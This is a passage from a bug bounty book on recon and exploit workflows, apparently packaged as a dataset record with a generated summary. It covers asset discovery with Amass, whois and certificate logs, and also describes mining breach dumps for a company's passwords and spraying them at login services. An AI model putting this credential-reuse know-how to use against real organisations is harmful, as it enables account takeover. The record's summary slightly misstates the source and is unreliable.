All A records\nshould be added to a list of IPs belonging to the company.\n\nCIDR\nDepending on the size of the organization they might have their own Classless\nInter-Domain Routing (CIDR) range. If you don’t know a CIDR range is just a\nrange of IP addresses belonging to an organization. Large companies tend to\nhave their own CIDR ranges but smaller companies will typically rent servers\nfrom a third-party vendor such as Rackspace or amazon web services (AWS) so\nthey won’t have a CIDR range. IP\nOnce you have gathered a list of IPs you will need to perform a port scan of each\none. It is vital that you know which protocols and services are exposed, if you\ndon’t properly fingerprint each host you will be missing potential vulnerabilities. You can perform port scans passively using third party scanners or you can scan\nthe target yourself. I typically like to use third parties, but in some instances, I\nneed to scan a specific port that these third parties don’t support. It is also a good\nidea to determine the geo location and autonomous system number (ASN) so\nGhostlulz AKA Alex Thomas\nPage | 46\nyou know where the IP is located and which company owns it. As you will learn\nlater some vulnerabilities and exploits can be enhanced depending on the\nenvironment they are found in. For example, getting SSRF on a host located on\nAWS can result in a finding with much greater impact, this will be discussed later\nin the book. Web Applications\nThe final step in this recon process is to take the list of subdomains and IPs\nrunning a web application and perform fingerprinting and content discovery on\nthem. You will need to know what technology runs on each endpoint. Properly\nfingerprinting your target is extremely important as it can directly lead to finding\nvulnerabilities. For instance, if you see a site is running WordPress you might run\na WordPress scanner on it. If you see an Apache Struts page you might try some\nknown CVEs for that, the list goes on. After your fingerprint the host you will want\nto perform content discovery. This means you will try to figure out what pages are\non the target domain. This is typically done by crawling or performing a directory\nbrute force on the site. Conclusion\nThis is a very BASIC overview of what your process might look like. If you’re just\ngetting into bug bounties you want to practice and master this process. You must\nlearn to walk before you start running. I said this was a basic methodology, there\nare definitely some other tricks to the game but almost everyone follows this\nbasic workflow to some degree. Ghostlulz AKA Alex Thomas\nPage | 47\nGitHub Workflow\nIntroduction\nThis is probably one of my favorite workflows because it’s so easy to perform and\nit has a high chance of producing critical severity findings if done properly. Almost every developer uses GitHub to store their source code. Sometimes\ndevelopers will upload hard coded credentials in their source code and config\nfiles for the world to see. These can be used to do all kinds of things. Workflow\nDuring the recon process you will want to spend effort trying to locate source\ncode repositories that your target as uploaded. This is in the recon process but\nsome may say it belongs in the exploit phase because the moment you find\nworking credentials it becomes a vulnerability. However, I decided to put this in\nthe recon phase because you must do a substantial amount of recon find these\nsource code repositories. Figure 13: GitHub workflow flowchart\nGhostlulz AKA Alex Thomas\nPage | 48\nConclusion\nSearching for sensitive information in GitHub is an up and coming technique that\na lot of people are using to compromise organizations. Almost every developer\nuses GitHub to manage and store their source code. With a little recon you can\nfind these repositories and if you get lucky you will find some hard-coded\ncredentials that can be used to login to their application or server. I have\npersonally used this technique to pop multiple fortune 500 companies. You could\nargue that this should go under the exploitation phase but I always end up\nperforming this workflow in my recon process. However, in this book, this\ntechnique will be discussed in the exploitation section even though I perform this\nduring the recon process. Cloud Workflow\nIntroduction\nThere are several different cloud providers that companies use instead of hosting\ntheir own infrastructure. AWS, Google Cloud, Azure, and Digital ocean are a few\nof these providers. Each of these providers offer the same service, they will host\nall of your infrastructure for you. This means your VPS, database, storage, and\neverything else can be hosted in the cloud. Workflow\nPeople have been pillaging AWS S3 buckets for some time now. In case you\ndon’t know S3 buckets is a place to store files, it acts as your cloud storage. Ghostlulz AKA Alex Thomas\nPage | 49\nSometimes companies will leave these open to the public allowing people to\ndownload sensitive data. AWS is not the only one impacted by this, nearly all\ncloud providers share this misconfiguration. Figure 14: Cloud workflow flowchart\nIn this workflow you would check each cloud provider to see if your target has\nany assets with a misconfigured storage bucket. This is a very popular workflow\nthat has gotten bug bounty hunters and pentesters plenty of easy wins\nConclusion\nCompanies are starting to ditch the idea of hosting their own servers and they\nare moving to the cloud. This migration can be complex so mistakes and\nmisconfigurations can easily be introduced into the environment. Once you find\nan open storage bucket you should look for exposed sensitive data. Ghostlulz AKA Alex Thomas\nPage | 50\nGoogle Dork Workflow\nIntroduction\nGoogle dorks have been around for a long time and hackers have been using\nthem to find vulnerabilities and for open source intelligence gathering(OSINT) for\njust as long. Google dorks allow you to filter through the massive amount of data\nGoogle collects to find specific things, for example if you only want to show PDF\nfiles hosted on an endpoint there is a dork for that. My favorite use cases are to\nuse google dorks to locate sensitive information on third party sites that my target\nuses. Workflow\nThis workflow is neat because it requires zero technical knowledge yet can have\ndevastating impacts. However, it does require a lot of time to shift through all the\nirrelevant data but you can stumble across some real interesting stuff. Figure 15: Google dorks workflow flowchart\nI legit used this workflow all the time because it’s so simple and easy. I’ve used\nthis to find remote code execution (RCE), working credentials, and potential\nGhostlulz AKA Alex Thomas\nPage | 51\nleads. This technique will be talked about in detail later in the book, so I won’t\nspoil it here. Conclusion\nGoogle dorks are one of the oldest and well-known workflows out there. People\nhave been using this technique for decades to perform OSINT on their targets,\nbut for some reason I see people failing to implement it into their own workflow. Leaked Credentials Workflow\nIntroduction\nThis workflow may not be in scope for bug bounty programs but I still wanted to\nmention it here. Hackers have been hacking websites and dumping their\ndatabases online for decades now. Using these databases leaks it is possible to\nfind users email and password combinations. These credentials could then be\nused to login to other accounts due to password re-use. Workflow\nIf you’re doing bug bounties this workflow might be out of scope. However,\nhackers have used this workflow to compromise high priority targets in the past. Ghostlulz AKA Alex Thomas\nPage | 52\nFigure 16: Leaked credentials workflow flowchart\nFirst you must go out and find all of these database leaks. These can be\ndownloaded for free by simply searching on google. I won’t show you where to\nfind these you will have to do that yourself. Once you have your database leaks\nthe final step is to grep through these files for your target domain, something like\n“*@example.com”. After that is completed you should have a list of emails with\ntheir associated clear text password. Figure 17: Parsing LinkedIn database leak for company credentials\nSome stuff has been blurred out but as you can see, we have a list of emails and\ntheir associated passwords. These credentials could then be used to login to an\norganization's SSH, VPN, email, or any other service that is exposed to the\nGhostlulz AKA Alex Thomas\nPage | 53\ninternet. These workflows are meant to be of a high level without technical details\nbut I was a little less vague on this process because I won’t be talking about this\nworkflow past this point. I only included this workflow so that you become aware\nof this attack. Conclusion\nHackers have been hacking databases since the beginning of time. If these\ndatabase leaks are posted online, we can perform searches against them to find\nuser credentials belonging to our target. This combined with the fact that people\nlove to reuse passwords will often lead to an easy victory. Though you should\nknow that this type of attack is probably out of scope if you’re doing a bug\nbounty. Exploit Workflows\nNew CVE Workflow\nIntroduction\nThis is another favorite workflow of mine which has allowed me to find Remote\nCode Execution (RCE) and other critical vulnerabilities. However, unlike other\nworkflows this can only be initiated a limited number of times per year. It's not\nevery day that a new RCE comes out. Ghostlulz AKA Alex Thomas\nPage | 54\nWorkflow\nSo, this workflow revolves around pouncing on a target the second a new CVE\nwith a working POC comes out. You aren't looking for lame vulnerabilities here,\nyou are looking for high impact vulnerabilities like SQL injection, and RCE. I\nhave personally had a lot of success with this workflow and can guarantee it will\nwork if done properly. Figure 18 New CVE workflow flowchart\nIn order for the workflow to work you need to be one of the first people exploiting\na new CVE, remember you don't get paid for duplicates so it’s a race against the\nclock. You are competing against the blue team patching their software and the\nrest of us bug bounty hunters who are searching for these vulns. If you have\nproperly set up your pre game environment you will be able to tell the second a\nnew CVE drops via NIST and other sources. It’s vital that you know within the\nfirst 24 - 72 hours. After that, things start to become mainstream others will learn\nabout the exploit which means more competition and more chances of the blue\nteam patching. You don’t want to be that hunter who missed the opportunity to\ncash in on easy wins, you need to know the day something critical drops. Hopefully you have already fingerprinted your targets so you can easily search\nwhich domains are impacted by the new CVE. If not, you will move directly to this\nphase to determine which targets to go after. Let's say some dude named\nGhostlulz AKA Alex Thomas\nPage | 55\nOrange drops a Palo alto firewall RCE exploit. You will need to figure out if your\ntargets are running Palo alto so you can launch the exploit. You don’t want to go\naround trying to exploit everything as that would be foolish. Once you find some\npotential targets via fingerprinting you should launch the POC exploit code and\nwait to see if it worked. Conclusion\nThis is a really basic workflow but it produces superb results. There really isn't\nanything fancy you just wait for new exploits to come out and run them against\nyour target before they get a chance to patch their systems. Here it's all about\nspeed, your racing against the blue team and other bug bounty hunter. The\nsecond a new CVE drops with a working POC you want to be exploiting it. This\nworkflow only happens every so often and you have to act fast when it does. If\nyou are one of the first ones to react you are almost guaranteed a win. Known Exploit/Misconfiguration Workflow\nIntroduction\nThis is a workflow that everyone is most likely already doing. Searching for\nknown vulnerabilities is taught in every ethical hacking course, it’s one of the first\nthings you learn. If this workflow isn’t a part of your process then you are\nseriously missing out on a lot of vulnerabilities. Ghostlulz AKA Alex Thomas\nPage | 56\nWorkflow\nThe basic idea here is to fingerprint your targets assets so you can find known\nCVEs and misconfigurations impacting their technology stack. For example, if\nyour target is running apache struts then you may want to try launching some\nthrowing some apache struts exploits at the target. Figure 19: Known exploit / misconfig workflow flowchart\nYou need to fingerprint both the targets domains and IPs. Once that is\ncompleted you can search for public CVEs with working POCs. You’re not only\nlooking for CVEs, you’re also looking for misconfigurations. CVEs get patched\nwhile misconfigurations can happen at any time to anyone, that's why I find\nmisconfigurations so interesting. Each technology stack has their own\nmisconfigurations so you need to be familiar with everything. Conclusion\nSearching for known exploits and misconfigurations is how most beginners learn\nto hack. I can confirm after many years in the field I still use this workflow to find\nvulnerabilities. As you gain experience and are exposed to different technology\nGhostlulz AKA Alex Thomas\nPage | 57\nstacks you will get better at this workflow. The key to this workflow is knowing\nhow to google information and experience. CMS Workflow\nIntroduction\nThis workflow is similar to known exploit/misconfiguration workflow except we are\nspecifically targeting content management systems (CMS). According to the\ncompany w3techs over half of the internet uses some kind of CMS. Figure 20: Percentage of internet using CMS\nWordPress alone runs over 30% of all sites on the internet."
  },
  {
    "input": "What are the key techniques and tools used in the reconnaissance phase to identify and gather information about a target's assets and endpoints?",
    "summary": "The text discusses various workflows used in vulnerability testing, including the CMS workflow, OWASP workflow, and brute force workflow. It emphasizes the importance of identifying websites running a CMS, as over half the internet is powered by one. The OWASP workflow focuses on finding common web vulnerabilities like SQL injection and XSS through manual testing. The brute force workflow involves guessing admin credentials and is often used with tools like GitHub subdomain enumeration. The text also highlights the value of using tools like Amass and Masscan for asset discovery and fingerprinting. Finally, it explains that the recon phase is critical for finding vulnerabilities and that techniques like subdomain enumeration and Google dorks are essential for this process.",
    "output": "So being able to\nproperly probe these systems for vulnerabilities is vital as you are guaranteed to\ncome across them in the wild. Ghostlulz AKA Alex Thomas\nPage | 58\nWorkflow\nYour process changes a little when dealing with a CMS but it's similar to the\nknown vulnerability workflow. Over half the internet is ran by a CMS so there\nhave been a lot of people poking at these systems over the years and that work\nhas led to lots of exploits being released to the public. These exploits are\ngenerally bundled up as some sort of tool which scans for everything, this makes\nyour life a lot easier as a tester, all you need to know is what tool to run for which\n\nCMS. Figure 21: CMS workflow flowchart\nThis workflow relies entirely on being able to identify websites running a CMS. If\nyou don’t know how to fingerprint an application you won’t be able to pick the\ncorrect scanner to run against it. This process will be talked about in detail later\nin the book. Conclusion\nHalf the internet is running by a CMS which means you're definitely going to be\ncoming across these while testing. You don’t typically perform manual testing\nGhostlulz AKA Alex Thomas\nPage | 59\nagainst a CMS, you normally run some type of scanner against the host which\nlooks for known CVEs and misconfigurations. OWASP Workflow\nIntroduction\nThis workflow is normally done manually with little help from automated\nscanners. You are looking for OWASP type vulnerabilities such as SQL injection\ncross site request forgery (CSRF), Cross site scripting (XSS), Authentication\nissues, IDOR, and much more. These are your common vulnerabilities found in\nevery web application. While looking manually be on the lookout for architecture\nand logic flows that automated scanners can’t pick up. Note that manual testing\ntends to find unique vulnerabilities that tend to pay very well. Workflow\nThis workflow is used to find classic web vulnerabilities described by OWASP. If\nyour hunting for XSS, SQLI, IDOR, file upload, or any other vulnerability it will\nshould during this phase. Ghostlulz AKA Alex Thomas\nPage | 60\nThis workflow relies heavily on manually testing to find vulnerabilities, you want\nto focus in on a single endpoint belonging to your target. However, automated\nscanners can be used to find low hanging fruit and they help speed up the\nprocess. For example, you could utilize burp scanner to help find vulnerabilities in\nan application. That being said the vast majority of your findings will come from\nmanual analysis. Authentication issues, logic flaws, and several other\nvulnerabilities are extremely hard to find with automated scanners. Conclusion\nThis workflow tends to be a mix of manual and automated testing. You want to\nlook at the endpoint manually so you can cover it in depth, find unique\nvulnerabilities, and test for vulnerabilities that scanners can’t do. You are looking\nfor OWASP vulnerabilities found in the vast majority of applications, this should\nnot be limited to just the OWASP top 10. As you gain experience testing\napplications you will get better at this approach. Brute Force Workflow\nIntroduction\nThis workflow involves brute forcing exposed admin interfaces, SSH services,\nFTP, services, and anything else that accepts credentials. If doing this for bug\nbounties make sure this technique is in scope. A lot of companies prohibit this\nGhostlulz AKA Alex Thomas\nPage | 61\ntype of testing but I’m going to talk about it anyway because it’s a valuable\ntechnique to know. Workflow\nThis workflow works well with the GitHub workflow and the leaked credentials\nworkflow. If you find working credentials on GitHub or if you find a database leak\nwith the targets credentials you could spray those across all of their login\nservices to see if they work. You could also build a list of default or common\nusernames and passwords and spray those across the target’s login services. Figure 22: Brute force workflow flowchart\nThis workflow has been used by malicious hackers and pentesters alike but a lot\nof bug bounty programs prohibit this type of testing. So, make sure this type of\nattack is in scope before using this workflow. Conclusion\nBrute forcing credentials is an age-old attack. This attack may be old but it still\nworks all the time, guessing admin credentials is an instant game over. The only\nGhostlulz AKA Alex Thomas\nPage | 62\nissue with this workflow is that many organizations will consider this type of\nattack out of scope so make sure to check. Summary\nA workflow is a high-level view of an attack process. Specific technologies and\ntooling are not mentioned on purpose as over time tools evolve and change. These workflows stay true regardless of what tool you use, though some tools\nmay enhance your results. Everyone should master the traditional workflow which includes finding\nsubdomains, IPs, fingerprinting endpoints, and other standard practices. This\nrecon workflow is critical for other workflows to happen. The GitHub and cloud\nworkflow are excellent for finding vulnerabilities from the start, if you’re looking for\nquick dirty wins these are the workflows for you. The information gathered in the traditional workflow feeds the vast majority of the\nexploit workflows. The new CVE, known/misconfiguration, and CMS workflows all\nrely on fingerprint data gathered during the traditional workflow. These workflows\nmake for a perfect combination and this is how many bug bounty hunters\noperate. Some bug bounty hunters prefer to do things manually, which is where\nthe OWASP workflow comes in. This workflow is used to find those typical\nOWASP vulnerabilities and other web exploits that scanners typically miss. You\nwill see some of your biggest payouts come from this workflow as you will find\nunique vulnerabilities that have a heavy impact. Ghostlulz AKA Alex Thomas\nPage | 63\nHacking is a science and an art. At the end of the day you will have to do what\nworks best for you but it’s best to have things mapped out so you have a general\nidea of what to do. You can mix different workflows together or you can come up\nwith something totally different, you will have to decide what works best for you\nand how you want to operate. Ghostlulz AKA Alex Thomas\nPage | 64\nSection 2: Reconnaissance\nIntroduction\nOne of the first steps when starting an engagement is to do some\nreconnaissance on your target. Recon will make or break you. If you fail to do\nthis process correctly it will severely hinder your results and the likelihood of\nfinding vulnerabilities. Ghostlulz AKA Alex Thomas\nPage | 65\nChapter 6: Reconnaissance Phase 1\nIntroduction\nIn my opinion one of the best explanations of the beginning recon process is from\n0xpatrik. The beginning of the recon phase is broken down into vertical and\nhorizontal correlation. The idea behind horizontal correlation is to find all assets\nrelated to a company. This could be acquisitions, CIDR ranges, and domains that\nare owned by the same person. Vertical correlation when dealing with domains\ninvolves finding all subdomains belonging to a single domain. Figure 23: Vertical & horizontal domain enumeration\nGhostlulz AKA Alex Thomas\nPage | 66\nCIDR Range\nIntroduction\nA Classless Inter-Domain Routing (CIDR) range is a short way of representing a\ngroup of IP addresses. Compromising a server hosted on a company’s CIDR\nrange may lead you directly into their internal network therefore these assets are\nconsidered critical and are ideal targets. Depending on the targets scope you\nmay be able to target a company’s CIDR range. I would expect this to be clearly\ndefined in the scope but for large organizations you may have to figure this out\nyourself. ASN\nIntroduction\nAn Autonomous System Number (ASN) is a way to represent a collection of IPs\nand who owns them. The IP address pool is spread across five Regional Internet\nRegistries (RIRs) AFRINIC, APNIC, ARIN, LACNIC, and RIPE NCC. The\nproviders then allocate IP ranges to different organizations. If a company wishes\nto buy a block of IP addresses, they must purchase it from one of these\nproviders. Ghostlulz AKA Alex Thomas\nPage | 67\nASN Lookup\nEach RIRs has their own way to query their database of information. You could\ngo out to each one separately or you could use a service that aggregates all the\nresults together. Figure 24: ASN lookup site\nWe can use (https://mxtoolbox.com/asn.aspx) to find a company’s ASN as well\nas their correlating CIDR ranges. Note that small organizations won’t have a\ndedicated CIDR range, they normally use third party cloud vendors such as AWS\nand Rackspace, or they will host their stuff under an internet service provider\n(ISP) IP. However, large companies tend to have their own CIDR range and we\ncan use this information to target machines hosted there. Ghostlulz AKA Alex Thomas\nPage | 68\nConclusion\nCIDR ranges can be used to help identify assets belonging to an organization. Small organizations tend to host all their assets on the cloud but large\norganizations will have a dedicated IP range. If a company wants a CIDR range it\nmust be allocated to them by one of the five RIRs. These databases are public\nand can be queried to determine what resources an organization owns. If servers\nhosted on these IPs are compromised, they could link directly into the targets\ninternal network, this is what makes these targets so interesting. Reverse Whois\nIntroduction\nAnother trick to find assets owned by an organization is to see which domains\nthat company has purchased. When registering a domain your information is\nsaved in a whois database. This information contains the registers name,\naddress, email, and much more. Searching the whois database we can find all\ndomains registered by the email “*.example.com”. Some people will use whois\nguard to hide this information but many companies forget to enable this. Note\nthat some companies have a predefined scope that can’t be broken but others\nhave very large and open scopes and this technique can be used to find hidden\nassets. Ghostlulz AKA Alex Thomas\nPage | 69\nReverse whois\nThere are several online sources that constantly monitor and scrape the whois\ndatabase for analysis. We can use these services to find domains that are owned\nby the same organization. Figure 25: Reverse whois lookup\nThe online service can be used to perform reverse whois searches for free. This\nservice uses historical whois data to find domains that were registered using the\nsame email. ● https://viewdns.info/reversewhois\nGhostlulz AKA Alex Thomas\nPage | 70\nConclusion\nUsing historical whois data to perform reverse whois searches is an excellent\nway to find domains that were purchased by the same organization. Companies\noften own more than one domain so finding these additional assets can help\nwiden your scope. Reverse DNS\nIntroduction\nWithout the Domain Name System (DNS) you wouldn't be able to correlate\ndomains to IPs (if you don't know what DNS is, I would suggest googling it now). DNS records contain several bits of information that can be used to correlate\ndomains to one another. The A, NS, and MX records are the most popular ways\nto find domains that are likely to be owned by the same person. If domains share\nthe same A, NS, or MX record then it is possible they are owned by the same\nperson. We can use reverse IP, reverse name server, and reverse mail server\nsearches to find these domains. Ghostlulz AKA Alex Thomas\nPage | 71\nReverse Name server\nLarge companies often host their own name servers so they can route traffic to\nthe correct IPs. These servers are configured by the organization who owns them\nso it stands to say that Microsoft wouldn’t have domains pointing to a Facebook\nname server. We can assume that any domain pointing to a Facebook name\nserver must be owned by Facebook, though you may find a few edge cases. Figure 26: DNS nameserver lookup\nIt is important to note that this name server isn’t pointing to a generic name\nserver like “ns1.godaddy.com”. There are hundreds of thousands of domains\npointing to GoDaddy nameservers, it’s a generic name server that a lot of people\nuse. To perform reverse name server lookups the name server must be owned\nby the organization otherwise you will get a lot of false results. Ghostlulz AKA Alex Thomas\nPage | 72\nFigure 27: Reverse nameserver search\nWe can use the service provided by to perform reverse name server lookups. It\ncan be assumed that these endpoints belong to Facebook but you may have a\nfew false positives in there. ● https://domaineye.com/\nReverse Mail Server\nWe can use the same technique to perform reverse mail server searches. Just\nlike before the MX record returned must be owned by the target organization. Figure 28: DNS mail server lookup\nGhostlulz AKA Alex Thomas\nPage | 73\nJust as before use https://domaineye.com/ to perform the reverse mail server\nsearch. Reverse IP\nUtilizing the companies CIDR ranges we can perform a reverse IP search to find\nany domains that are hosted on those IPs. Some people will also use the A\nrecord of their target domain to perform this reverse IP search. Again, you can\nuse https://domaineye.com/ to perform this search. Conclusion\nDNS records can be used to tie domains together. If domains share the same A,\nNS, or MX record we can assume they are owned by the same entity. There may\nbe some false positives but these can be filtered out. This technique will greatly\nincrease your scope has a bug bounty hunter, just make sure it’s allowed first. Google Dork\nIntroduction\nGoogle dorks have been around for a while. I will discuss google dorks in greater\ndetail later in the book. For now, we will be using the “intext” dork to find words\nthat are present on a webpage. Ghostlulz AKA Alex Thomas\nPage | 74\nDork\nAt the bottom of most pages you will see some sort of copyright tag. This unique\ntag can be utilized to find domains owned by the same company. Figure 29: Starbucks copyright text\nWe can then take that copyright text and search for every other website that\ncontains this text. Ghostlulz AKA Alex Thomas\nPage | 75\nFigure 30:Google search for copyright text\nConclusion\nUsing the “intext” google dork with an organizations copyright text we can find\nsites owned by the same company.\n\nGoogle dorks are a great way to find hidden\nassets the only drawback is that this technique tends to be highly manually. Tools\nAmass\nIntroduction\nAmass is the most popular asset discovery tool there is. This tool has many\nfeatures and acts as the swiss army knife of asset discovery. I will be using this\ntool a lot throughout this book so make sure you get comfortable with it. ● https://github.com/OWASP/Amass\nGhostlulz AKA Alex Thomas\nPage | 76\nInstallation\nFirst you need to install amass. To install amass follow the instructions at\n(https://github.com/OWASP/Amass/blob/master/doc/install.md). I personally used\nsnap to install amass, this can be done with the following command:\nsudo snap install amass\nASN\nRemember that we can use a company’s ASN number to find a list of assets\nbelong to the organization. First, we must find a list ASN numbers assigned to an\norganization using the following amass command:\namass intel -org <company name here>\nFigure 31: Amass ASN search\nThis command will return a list of ASN numbers that might belong to the\norganization, make sure to verify the names as there will be false positives\nsometimes. Now that you have a list of ASN numbers you can find the associated CIDR\nrange by using the following bash command:\nwhois -h whois.radb.net -- '-i origin <ASN Number Here>' | grep -Eo \"([0-\n9.]+){4}/[0-9]+\" | sort -u\nGhostlulz AKA Alex Thomas\nPage | 77\nFigure 32: Find CIDR range from ASN number\nYou can also use amass to find a list of domains running on a given ASN. This\nwill use reverse IP searches to find domains running on the IPs in the specified\nASN. The following command can be used to find domains running on a given\n\nASN:\namass intel -asn <ASN Number Here>\nFigure 33: Amass find domains hosted on an ASN\n\nCIDR\nAmass can also be used to find domains on a given CIDR range. We can use the\nfollowing command to find these endpoints:\namass intel -cidr <CIDR Range Here>\nGhostlulz AKA Alex Thomas\nPage | 78\nFigure 34: Amass find domains hosted in a CIDR range\nReverse Whois\nGiven a specific domain amass can utilize reverse whois searches to find other\ndomains purchased by the same user. The following command can be used to\nissue this request:\namass intel -whois -d <Domain Name Here>\nFigure 35: Amass reverse whois search\nConclusion\nAmass is one of the best tools for asset discovery. If you’re looking to expand\nyour scope by finding additional domains owned by your target amass is the\nperfect tool. Make sure to get comfortable with this tool as you will end up using it\na lot throughout your engagements.\nGhostlulz AKA Alex Thomas\nPage | 79\nSummary\nThis part of the recon process is all about horizontal correlation and expanding\nyour scope. Many bug bounty programs have a fixed scope to a set of domains\nor IPs so you won’t be allowed to targets others endpoints. However, some bug\nbounties have an open scope which allows you to target asset they own. Being\nable to find CIDR ranges, domains, and other assets is vital if your hunting on a\ntarget with an open scope Using the tool amass will allow you to perform this\nentire phase with one tool. The more targets you find in this phase the better your\nodds will be in finding a vulnerability in the exploitation phase.\nGhostlulz AKA Alex Thomas\nPage | 80\nChapter 7: Reconnaissance Phase 2\nWordlist\nIntroduction\nYour wordlist can make or break you during the reconnaissance phase. A bad\nword list will cause you to miss critical assets and endpoints. Word lists are used\nto find new subdomains, interesting files, cracking passwords, and much more.\nUsing the right word list will instantly increase your success rate when hunting for\nvulnerabilities.\nSec List\nIntroduction\nSeclists from danielmiessler is a very popular source of different wordlists. If\nyou’re looking for a good wordlist this should be the first place you look, chances\nare they have the wordlist you're looking for.\n● https://github.com/danielmiessler/SecLists\nRobots Disallow\nWhen performing directory brute force attacks, I generally try to focus my efforts\non finding interesting endpoints. I don't really care that there is an index.php\npage, I want to know if there is something juicy that can lead to a quick win this\ncan be accomplished with the robots disallow wordlist:\nGhostlulz AKA Alex Thomas\nPage | 81\n● https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-\nContent/RobotsDisallowed-Top1000.txt\nAs you know the robots.txt disallow directory is used to tell scraping bots such\nas google to not crawl certain files and file paths, this can be a good indication\nthat they are trying to hide something. The robots disallow wordlists is a\ncollection these directories taken from Alexa top 100K and the Majestic top 100K.\nBasically, some people went to the top 100k sites downloaded their robots.txt file\nand parsed out the disallow directories to a wordlist. If you’re looking to find\ninteresting endpoints on a target this is the list for you.\n\nRAFT\nThe RAFT lists seem to be everyone's favorite word list for directory brute forcing\nand I can see why. The RAFT wordlists contains a large number of interesting\nfilenames and directories. There are several different versions of this list ranging\nin size but I generally just go with the largest list. Make sure to use both the\ndirectories and files wordlist:\n● https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-\nContent/raft-large-directories.txt\n● https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-\nContent/raft-large-files.txt\nTechnology Specific\nDuring the fingerprinting phase you will determine the technology stacks used by\nvarious endpoints. If you know a target is running a specific technology you can\ndouble back to this phase and use a wordlist to specifically target that\nGhostlulz AKA Alex Thomas\nPage | 82\ntechnology. If you are running a directory brute force on a PHP application it\ndoesn't make sense to use a wordlist that contains .ASP filenames as those are\nassociated with .NET applications. Seclists contains specific wordlists for PHP,\nGolang, ASP, Apache, IIS, and a bunch more.\nFigure 36: Seclists GitHub repo\nGhostlulz AKA Alex Thomas\nPage | 83\nThere are also specific wordlists for CMSs. If you find a WordPress application it\nwould be a good idea to perform a directory brute force using a wordlist\nspecifically made for WordPress.\nConclusion\nSeclists is a one stop shop for wordlists. This repo will contain almost every\nwordlist you will need while hunting for bugs or performing a penetration test.\nThere are a bunch of wordlists in there make sure to spend some time trying out\ndifferent ones to see which one you like the best.\nCommon Speak\nCommon speak from Assetnote has a unique way of generating wordlists and\none of my favorite wordlists to use for subdomain brute forcing. There are\nnumerous datasets on Google Big query that are constantly being updated with\nnew information. These datasets are used by common speak to create a wordlist\nthat contain current technologies and terminology.\n● https://github.com/assetnote/commonspeak2\n● https://github.com/assetnote/commonspeak2-wordlists\nAll\nThe all word list from jhaddix is probably the largest wordlist out there, the\nmajority of people use this wordlist for subdomain brute forcing. If you're looking\nGhostlulz AKA Alex Thomas\nPage | 84\nfor a word list that contains everything this is the one for you. You won’t find a\nbigger word list than this one.\n● https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056\n\nCRTSH\nCertificate transparency logs will be talked about in depth later in the book but for\nnow all you need to know is every https domain is logged in a database\nsomewhere. Internetwache created a tool to scrape this database for\nsubdomains. Every hour Internetwache uses this tool to update his wordlist. This\nis an excellent way to get a list of relevant and up to date subdomains. This\nwordlist is highly underrated and should be used in your subdomain brute force\nphase. ● https://github.com/internetwache/CT_subdomains\nConclusion\nHaving a bad word list will cause you to miss all kinds of easy wins. Properly\npreparing a good word list to use is vital when performing directory, subdomain,\nor parameter brute forcing. Some of my best findings have come from having the\nright word in a wordlist. As you start finding interesting vulnerabilities and bugs\nyou may find yourself creating your own unique wordlist to use. Ghostlulz AKA Alex Thomas\nPage | 85\nSubdomain Enumeration\nIntroduction\nI know I say that every stage is vital to finding vulnerabilities but this is especially\ntrue here. Unless you plan on going after an organization's main site, you’re\ngoing to have to get good at enumerating subdomains as that’s how you’re going\nto find the majority of your targets. The internet is flooded with subdomain\nenumeration techniques and they are all very good. If you have been around bug\nbounties for a little bit the following techniques are going to feel familiar. Figure 37: Subdomain enumeration workflow flowchart\nGhostlulz AKA Alex Thomas\nPage | 86\nCertification Transparency Logs\nIntroduction\nAny site that starts with HTTPS:// uses SSL certificates to provide a secure\nconnection. If a hacker or rogue certificate authority is able to forge this certificate\nthey would be able to perform man in the middle attacks. To help thwart rogue\ncertificate authorities from creating fake SSL certificates the certificate\ntransparency log was created. We as attackers can utilize this database to find\nsubdomains of a target, as long as they have an SSL certificate they will be\nlogged in a database. Certification Transparency Logs\nThe certificate transparency log is used to monitor and audit unauthorized\ncertificates. Every time you get an SSL certificate for your domain or subdomain\nit will be logged in certificate transparency logs. We can take advantage of this\nbehavior to help enumerate subdomains belonging to a domain. There are tools\nout there that go out and gather all the transparency log files and store them in\nlocally in a database. However, in this blog I’m going to be utilizing the site\nCERT.SH. We can find all SSL certificates belonging to a domain by issuing a\nGET request to https://crt.sh/?q=%25.facebook.com as shown below:\nGhostlulz AKA Alex Thomas\nPage | 87\nFigure 38: certificate transparency search for subdomains\nAs shown above you will be presented with a huge list of subdomains. Many\nsubdomain enumeration tools use certificate transparency logs as part of their\nenumeration process. Though there are tons of tools that do this automatically\nbehind the scenes but it's always nice to have a deeper understanding of what's\nhappening under the hood. Tools\nFeel free to browse the site in your browser but I personally like using the\ncommand line and a python script as it’s easier to parse out the subdomains. Ghostlulz AKA Alex Thomas\nPage | 88\nFigure 39: Command line certificate transparency search\nIf you want to use the command line for this checkout my tool I created to extract\nsubdomains from cert.sh:\n● https://github.com/ghostlulzhacks/CertificateTransparencyLogs\nConclusion\nCertificate transparency logs contain a list of all websites who request an SSL\ncertificate for their domain. These logs were created to help spot forged\ncertificates but we can use them in our subdomain enumeration process. Search Engine\nGoogle dorks can be utilized to find subdomains with the following dork:\n● site:\nThis specific dork will return all links belonging to a specific domain. Ghostlulz AKA Alex Thomas\nPage | 89\nFigure 40: Google dork to find subdomains\nThis technique can be done manually but it’s best to use a tool for this type of\njob. Forward DNS\nIntroduction\nRapid7 Project Sonar conducts internet-wide surveys to gain insights into global\nexposure to common vulnerabilities. Some of this data is provided for free for\nsecurity researchers to utilize. Utilizing the forward DNS dataset, we can gather a\nhuge list of subdomains belonging to an organization. Ghostlulz AKA Alex Thomas\nPage | 90\nRapid 7 Forward DNS\nRapid 7 provides Any, A, AAAA, CNAME, MX, and TXT records of every domain\nthey know about. This information is regularly updated and archived; this means\nwe can also search historical data for subdomains. ● https://opendata.rapid7.com/sonar.fdns_v2/\n● https://opendata.rapid7.com/sonar.fdns/\nOnce the dataset is downloaded you can utilize the zgrep tool to parse out\nsubdomains as shown in the following command:\nzgrep ‘\\.domain\\.com”,’ path_to_dataset.json.gz\nFigure 41: Parse subdomains from forward DNS dataset\nNote that gzip searches based on a regex so you must escape the “.” characters\nwith a forward slash “\\”. This process is fairly slow as your system has to grep\nthrough 30GB of text. This technique should provide you with a very large list of\nsubdomains. Conclusion\nRapid7 regularly scans the internet and provides this data for security\nresearchers to utilize. We can use the forward DNS data to find subdomains\nGhostlulz AKA Alex Thomas\nPage | 91\nbelonging to our target. Although this process is slow, it will provide you with a\nlarge set 